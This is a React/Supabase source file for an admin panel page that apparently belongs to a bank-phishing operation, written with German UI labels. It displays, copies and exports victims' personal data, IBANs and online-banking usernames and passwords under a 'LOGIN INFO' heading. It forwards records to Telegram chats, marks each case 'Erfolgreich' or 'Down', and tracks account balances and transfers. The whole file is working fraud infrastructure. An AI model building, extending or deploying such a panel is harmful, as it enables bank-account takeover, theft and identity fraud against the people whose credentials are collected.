import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import AdminLayout, { useAdminUser } from "@/components/AdminLayout";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent as AlertContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle as AlertTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import { toast } from "sonner";
import { ArrowLeft, Copy, Download, FileDown, Minus, Plus, Save, Send, Trash2 } from "lucide-react";
import { useSubmission, type Note, type Submission } from "@/hooks/use-submissions";
import { useQueryClient } from "@tanstack/react-query";
import { formatBalance, formatIBAN, parseBalanceNumber } from "@/lib/format";

const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;

const statusConfig: Record<string, { dot: string; bg: string; text: string }> = {
  "Neu": { dot: "bg-slate-400", bg: "bg-slate-50", text: "text-slate-700" },
  "In Bearbeitung": { dot: "bg-blue-500", bg: "bg-blue-50/60", text: "text-blue-700" },
  "Erfolgreich": { dot: "bg-emerald-500", bg: "bg-emerald-50/60", text: "text-emerald-700" },
  "Down": { dot: "bg-red-500", bg: "bg-red-50/60", text: "text-red-700" },
};

function getInitials(name: string | null | undefined): string {
  if (!name) return "?";
  return name.split(" ").map((w) => w[0]).filter(Boolean).slice(0, 2).join("").toUpperCase();
}

function DetailContent() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const user = useAdminUser();
  const queryClient = useQueryClient();
  const { submission, isLoading: loading } = useSubmission(id);
  const [notes, setNotes] = useState<Note[]>([]);
  const [newNote, setNewNote] = useState("");
  const [savedBalance, setSavedBalance] = useState("");
  const [balanceInput, setBalanceInput] = useState("");
  const [status, setStatus] = useState("Neu");
  const [savingBalance, setSavingBalance] = useState(false);
  const [savingNote, setSavingNote] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [exportOpen, setExportOpen] = useState(false);
  const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
  const [txAmount, setTxAmount] = useState("");
  const [txNote, setTxNote] = useState("");
  const [resending, setResending] = useState(false);

  const resendTelegram = async () => {
    if (!id) return;
    setResending(true);
    const { data, error } = await supabase.functions.invoke("notify-telegram", {
      body: { submission_id: id, kind: "auto", force: true },
    });
    setResending(false);
    if (error || !data?.ok) { toast.error("Fehler beim Senden"); return; }
    if (data.sent > 0) toast.success(`An ${data.sent} Chat(s) gesendet (${data.kind})`);
    else toast.warning("Keine passenden Chats gefunden (Domain prüfen)");
  };

  useEffect(() => {
    if (submission) {
      setSavedBalance(submission.balance || "");
      setBalanceInput(submission.balance || "");
      setStatus(submission.status || "Neu");
    }
  }, [submission]);

  useEffect(() => {
    if (id) {
      supabase.from("submission_notes").select("*").eq("submission_id", id).order("created_at", { ascending: false })
        .then(({ data }) => { if (data) setNotes(data as Note[]); });
    }
  }, [id]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!id) return;
    setSavingBalance(true);
    const trimmed = balanceInput.trim();
    const formatted = trimmed ? formatBalance(trimmed) : null;
    const { error } = await supabase.from("submissions").update({ balance: formatted }).eq("id", id);
    setSavingBalance(false);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      const val = formatted || "";
      setSavedBalance(val);
      setBalanceInput(val);
      toast.success("Guthaben gespeichert");
      queryClient.invalidateQueries({ queryKey: ["submissions"] });
      queryClient.invalidateQueries({ queryKey: ["submission", id] });
    }
  };

  const txPreview = (() => {
    if (!txMode || !txAmount.trim()) return null;
    const txNum = parseBalanceNumber(txAmount);
    if (isNaN(txNum) || txNum <= 0) return null;
    const currentNum = parseBalanceNumber(savedBalance || "0");
    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
    return formatBalance(String(newNum));
  })();

  const handleTransaction = async () => {
    if (!id || !user || !txAmount.trim() || !txMode) return;
    const currentNum = parseBalanceNumber(savedBalance || "0");
    const txNum = parseBalanceNumber(txAmount);
    if (isNaN(txNum) || txNum <= 0) { toast.error("Ungültiger Betrag"); return; }
    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
    const newFormatted = formatBalance(String(newNum));
    const sign = txMode === "+" ? "+" : "−";
    const noteContent = `${sign}${formatBalance(txAmount)}${txNote.trim() ? ` — ${txNote.trim()}` : ""}`;
    const { error: balErr } = await supabase.from("submissions").update({ balance: newFormatted }).eq("id", id);
    if (balErr) { toast.error("Fehler beim Speichern"); return; }
    const { data: noteData } = await supabase.from("submission_notes").insert({
      submission_id: id, user_id: user.id, user_email: user.email || "unknown", content: noteContent,
    }).select().single();
    setSavedBalance(newFormatted);
    setBalanceInput(newFormatted);
    if (noteData) setNotes((prev) => [noteData as Note, ...prev]);
    queryClient.invalidateQueries({ queryKey: ["submissions"] });
    queryClient.invalidateQueries({ queryKey: ["submission", id] });
    queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
    setTxMode(null); setTxAmount(""); setTxNote("");
    toast.success("Buchung gespeichert");
  };

  const saveStatus = async (newStatus: string) => {
    if (!id) return;
    const { error } = await supabase.from("submissions").update({ status: newStatus }).eq("id", id);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      setStatus(newStatus);
      toast.success("Status gespeichert");
      queryClient.invalidateQueries({ queryKey: ["submissions"] });
      queryClient.invalidateQueries({ queryKey: ["submission", id] });
    }
  };

  const addNote = async () => {
    if (!id || !user || !newNote.trim()) return;
    setSavingNote(true);
    const { data, error } = await supabase.from("submission_notes").insert({
      submission_id: id, user_id: user.id, user_email: user.email || "unknown", content: newNote.trim(),
    }).select().single();
    setSavingNote(false);
    if (error) { toast.error("Fehler beim Speichern der Notiz"); }
    else {
      toast.success("Notiz hinzugefügt");
      setNewNote("");
      if (data) setNotes((prev) => [data as Note, ...prev]);
      queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
    }
  };

  const handleDelete = async () => {
    if (!id) return;
    setDeleting(true);
    const { error } = await supabase.from("submissions").delete().eq("id", id);
    setDeleting(false);
    if (error) { toast.error("Fehler beim Löschen"); }
    else {
      toast.success("Eintrag gelöscht");
      queryClient.invalidateQueries({ queryKey: ["submissions"] });
      navigate("/admin/logs");
    }
  };

  const CopyValue = ({ label, value, mono }: { label: string; value: string | null | undefined; mono?: boolean }) => (
    <div className="group flex justify-between items-center py-2.5 border-b border-slate-100/80 last:border-0">
      <span className="text-[13px] text-slate-400">{label}</span>
      {value ? (
        <button onClick={() => copyToClipboard(value)} className={`text-[13px] font-medium text-slate-700 flex items-center gap-1.5 hover:text-blue-600 transition-colors ${mono ? "font-mono" : ""}`}>
          {value} <Copy className="h-3 w-3 opacity-0 group-hover:opacity-40 transition-opacity" />
        </button>
      ) : (
        <span className="text-[13px] text-slate-300">—</span>
      )}
    </div>
  );

  if (loading) {
    return <div className="flex items-center justify-center py-20"><p className="text-slate-400">Laden...</p></div>;
  }

  if (!submission) {
    return (
      <div className="text-center py-20">
        <p className="text-slate-400 mb-4">Eintrag nicht gefunden</p>
        <Button variant="outline" onClick={() => navigate("/admin/logs")}>← Zurück</Button>
      </div>
    );
  }

  const address = [submission.street, submission.house_number].filter(Boolean).join(" ");
  const addressExtra = [submission.staircase ? `Stiege ${submission.staircase}` : null, submission.door_number ? `Tür ${submission.door_number}` : null].filter(Boolean).join(", ");
  const fullAddress = [address, addressExtra, [submission.postal_code, submission.city].filter(Boolean).join(" ")].filter(Boolean).join(", ");
  const cfg = statusConfig[status] || statusConfig["Neu"];
  const balanceNum = parseBalanceNumber(savedBalance || "0");
  const balanceColor = balanceNum >= 0 ? "text-emerald-600" : "text-red-600";

  const exportText = [
    `fullname: ${submission.full_name || ""}`,
    `email: ${submission.email || ""}`,
    `city: ${submission.city || ""}`,
    `street: ${submission.street || ""}`,
    `housenumber: ${submission.house_number || ""}`,
    `stiege: ${submission.staircase || ""}`,
    `door: ${submission.door_number || ""}`,
    `postcode: ${submission.postal_code || ""}`,
    `birthdate: ${submission.birthdate || ""}`,
    `iban: ${submission.iban ? formatIBAN(submission.iban) : ""}`,
    `phone: ${submission.phone || ""}`,
    ``,
    `======> LOGIN INFO <=======`,
    `benutzername: ${submission.bank_username || ""}`,
    `passwort: ${submission.bank_password || ""}`,
    `bank: ${submission.bank || ""}`,
  ].join("\n");

  const downloadExport = () => {
    const name = (submission.full_name || "export").replace(/\s+/g, "_");
    const bank = (submission.bank || "unknown").replace(/\s+/g, "_");
    const blob = new Blob([exportText], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${name}_${bank}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <TooltipProvider>
      <div className="max-w-5xl space-y-6">
        {/* Header */}
        <div className="flex items-center gap-4">
          <Button variant="ghost" size="sm" onClick={() => navigate("/admin/logs")} className="gap-1.5 text-slate-400 hover:text-slate-700">
            <ArrowLeft className="h-4 w-4" /> Zurück
          </Button>
          <div className="flex items-center gap-3 flex-1 min-w-0">
            <div className="h-10 w-10 rounded-full bg-gradient-to-br from-slate-700 to-slate-900 flex items-center justify-center text-white text-sm font-semibold shrink-0">
              {getInitials(submission.full_name)}
            </div>
            <div className="min-w-0">
              <div className="flex items-center gap-2.5">
                <h1 className="text-lg font-bold text-slate-900 truncate">{submission.full_name || "Unbekannt"}</h1>
                {submission.bank && (
                  <span className="text-[11px] font-medium text-slate-400 bg-slate-100 rounded-full px-2.5 py-0.5 shrink-0">{submission.bank}</span>
                )}
              </div>
              <div className="flex flex-col mt-0.5">
                <span className="text-xs text-slate-500">
                  {submission.created_at ? new Date(submission.created_at).toLocaleDateString("de-AT") : "—"}
                </span>
                {submission.created_at && (
                  <span className="text-xs text-slate-400">
                    {new Date(submission.created_at).toLocaleTimeString("de-AT", { hour: "2-digit", minute: "2-digit" })} Uhr
                  </span>
                )}
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="outline" size="sm" className="gap-1.5 text-blue-600 border-blue-200 hover:bg-blue-50" onClick={resendTelegram} disabled={resending}>
              <Send className="h-3.5 w-3.5" /> {resending ? "Sendet..." : "An Telegram"}
            </Button>
            <Button variant="outline" size="sm" className="gap-1.5 text-slate-500 border-slate-200 hover:border-slate-300" onClick={() => setExportOpen(true)}>
              <Download className="h-3.5 w-3.5" /> Export
            </Button>
            <AlertDialog>
              <AlertDialogTrigger asChild>
                <Button variant="outline" size="sm" className="gap-1.5 text-red-500 border-red-200/60 hover:bg-red-50 hover:border-red-300">
                  <Trash2 className="h-3.5 w-3.5" /> Löschen
                </Button>
              </AlertDialogTrigger>
              <AlertContent>
                <AlertDialogHeader>
                  <AlertTitle>Eintrag löschen?</AlertTitle>
                  <AlertDialogDescription>
                    Dieser Eintrag wird unwiderruflich gelöscht. Alle zugehörigen Notizen und Anruf-Logs werden ebenfalls entfernt.
                  </AlertDialogDescription>
                </AlertDialogHeader>
                <AlertDialogFooter>
                  <AlertDialogCancel>Abbrechen</AlertDialogCancel>
                  <AlertDialogAction onClick={handleDelete} disabled={deleting} className="bg-red-600 hover:bg-red-700">
                    {deleting ? "Löscht..." : "Endgültig löschen"}
                  </AlertDialogAction>
                </AlertDialogFooter>
              </AlertContent>
            </AlertDialog>
          </div>
        </div>

        {/* Export Dialog */}
        <Dialog open={exportOpen} onOpenChange={setExportOpen}>
          <DialogContent className="max-w-lg">
            <DialogHeader><DialogTitle>Export</DialogTitle></DialogHeader>
            <Textarea readOnly value={exportText} rows={18} className="font-mono text-xs resize-none" />
            <div className="flex justify-end gap-2">
              <Button variant="outline" size="sm" onClick={() => { navigator.clipboard.writeText(exportText); toast.success("Kopiert!"); }} className="gap-1.5">
                <Copy className="h-4 w-4" /> Kopieren
              </Button>
              <Button size="sm" onClick={downloadExport} className="gap-1.5">
                <FileDown className="h-4 w-4" /> Download .txt
              </Button>
            </div>
          </DialogContent>
        </Dialog>

        {/* Cards Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          {/* Personal Data */}
          <Card className="rounded-xl border-slate-200/80 shadow-sm">
            <CardHeader className="pb-1">
              <CardTitle className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Persönliche Daten</CardTitle>
            </CardHeader>
            <CardContent>
              <CopyValue label="Name" value={submission.full_name} />
              <CopyValue label="E-Mail" value={submission.email} />
              <CopyValue label="Geburtsdatum" value={submission.birthdate} />
              <CopyValue label="Telefon" value={submission.phone} mono />
              <CopyValue label="Adresse" value={fullAddress || null} />
              <CopyValue label="IBAN" value={submission.iban ? formatIBAN(submission.iban) : null} mono />
            </CardContent>
          </Card>

          {/* Bank Login */}
          <Card className="rounded-xl border-slate-200/80 shadow-sm">
            <CardHeader className="pb-1">
              <CardTitle className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank-Login</CardTitle>
            </CardHeader>
            <CardContent>
              <CopyValue label="Bank" value={submission.bank} />
              <CopyValue label={submission.bank_username_label || "Benutzername"} value={submission.bank_username} mono />
              <CopyValue label={submission.bank_password_label || "Passwort"} value={submission.bank_password} mono />
              {submission.bank_extra && Object.keys(submission.bank_extra).length > 0 && (
                <>
                  {Object.entries(submission.bank_extra).map(([key, val]) => (
                    <CopyValue key={key} label={key} value={val} mono />
                  ))}
                </>
              )}
            </CardContent>
          </Card>

          {/* Status */}
          <Card className="rounded-xl border-slate-200/80 shadow-sm">
            <CardHeader className="pb-1">
              <CardTitle className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Status</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex items-center gap-3">
                <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${cfg.bg} ${cfg.text}`}>
                  <span className={`h-1.5 w-1.5 rounded-full ${cfg.dot}`} />
                  {status}
                </span>
                <Select value={status} onValueChange={saveStatus}>
                  <SelectTrigger className="w-[160px] h-8 text-xs"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {STATUS_OPTIONS.map((opt) => (
                      <SelectItem key={opt} value={opt}>
                        <span className="flex items-center gap-1.5">
                          <span className={`h-1.5 w-1.5 rounded-full ${statusConfig[opt]?.dot}`} />
                          {opt}
                        </span>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </CardContent>
          </Card>

          {/* Balance */}
          <Card className="rounded-xl border-slate-200/80 shadow-sm">
            <CardHeader className="pb-1">
              <CardTitle className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Guthaben</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              {savedBalance && (
                <div className="flex items-center justify-between">
                  <span className={`text-2xl font-bold ${balanceColor}`}>{savedBalance}</span>
                  <div className="flex gap-1">
                    <Tooltip>
                      <TooltipTrigger asChild>
                        <Button size="icon" variant="ghost" className="h-7 w-7 text-emerald-500 hover:bg-emerald-50" onClick={() => { setTxMode("+"); setTxAmount(""); setTxNote(""); }}>
                          <Plus className="h-3.5 w-3.5" />
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent>Betrag hinzufügen</TooltipContent>
                    </Tooltip>
                    <Tooltip>
                      <TooltipTrigger asChild>
                        <Button size="icon" variant="ghost" className="h-7 w-7 text-red-500 hover:bg-red-50" onClick={() => { setTxMode("-"); setTxAmount(""); setTxNote(""); }}>
                          <Minus className="h-3.5 w-3.5" />
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent>Betrag abziehen</TooltipContent>
                    </Tooltip>
                  </div>
                </div>
              )}
              <div className="flex gap-2">
                <Input placeholder="z.B. 55555" value={balanceInput} onChange={(e) => setBalanceInput(e.target.value)} onKeyDown={(e) => e.key === "Enter" && saveBalance()} className="h-8 text-sm" />
                <Button size="sm" onClick={saveBalance} disabled={savingBalance} className="gap-1.5 shrink-0 h-8 text-xs">
                  <Save className="h-3.5 w-3.5" /> Speichern
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Transaction Dialog */}
          <Dialog open={!!txMode} onOpenChange={(open) => !open && setTxMode(null)}>
            <DialogContent className="max-w-sm">
              <DialogHeader>
                <DialogTitle>{txMode === "+" ? "Betrag hinzufügen" : "Betrag abziehen"}</DialogTitle>
              </DialogHeader>
              <div className="space-y-3">
                <Input placeholder="Betrag (z.B. 10000)" value={txAmount} onChange={(e) => setTxAmount(e.target.value)} />
                <Input placeholder="Notiz (z.B. Echtzeitüberweisung)" value={txNote} onChange={(e) => setTxNote(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleTransaction()} />
                {txPreview && (
                  <p className="text-xs text-slate-400">Neuer Betrag: <span className="font-semibold text-slate-600">{txPreview}</span></p>
                )}
                <div className="flex justify-end gap-2">
                  <Button variant="outline" size="sm" onClick={() => setTxMode(null)}>Abbrechen</Button>
                  <Button size="sm" onClick={handleTransaction} disabled={!txAmount.trim()} className={txMode === "-" ? "bg-red-600 hover:bg-red-700" : "bg-emerald-600 hover:bg-emerald-700"}>
                    {txMode === "+" ? "Hinzufügen" : "Abziehen"}
                  </Button>
                </div>
              </div>
            </DialogContent>
          </Dialog>

          {/* Notes */}
          <Card className="rounded-xl border-slate-200/80 shadow-sm md:col-span-2">
            <CardHeader className="pb-1">
              <CardTitle className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Notizen</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Textarea placeholder="Neue Notiz schreiben..." value={newNote} onChange={(e) => setNewNote(e.target.value)} rows={3} className="resize-none text-sm" />
                <Button size="sm" onClick={addNote} disabled={savingNote || !newNote.trim()} className="h-8 text-xs">Notiz hinzufügen</Button>
              </div>
              {notes.length > 0 ? (
                <div className="space-y-2.5 max-h-80 overflow-y-auto">
                  {notes.map((note) => (
                    <div key={note.id} className="rounded-lg border border-slate-100 p-3 text-sm bg-slate-50/40">
                      <div className="flex items-start gap-2.5">
                        <div className="h-6 w-6 rounded-full bg-slate-200 flex items-center justify-center text-[10px] font-semibold text-slate-600 shrink-0 mt-0.5">
                          {getInitials(note.user_email.split("@")[0])}
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-xs font-medium text-slate-500">{note.user_email}</span>
                            <div className="flex flex-col items-end">
                              <span className="text-[11px] text-slate-400">
                                {new Date(note.created_at).toLocaleDateString("de-AT")}
                              </span>
                              <span className="text-[11px] text-slate-300">
                                {new Date(note.created_at).toLocaleTimeString("de-AT", { hour: "2-digit", minute: "2-digit" })} Uhr
                              </span>
                            </div>
                          </div>
                          <p className="text-slate-700 whitespace-pre-wrap text-[13px]">{note.content}</p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-sm text-slate-400">Keine Notizen vorhanden</p>
              )}
            </CardContent>
          </Card>
        </div>
      </div>
    </TooltipProvider>
  );
}

const AdminLogDetail = () => (
  <AdminLayout>
    <DetailContent />
  </AdminLayout>
);

export default AdminLogDetail;
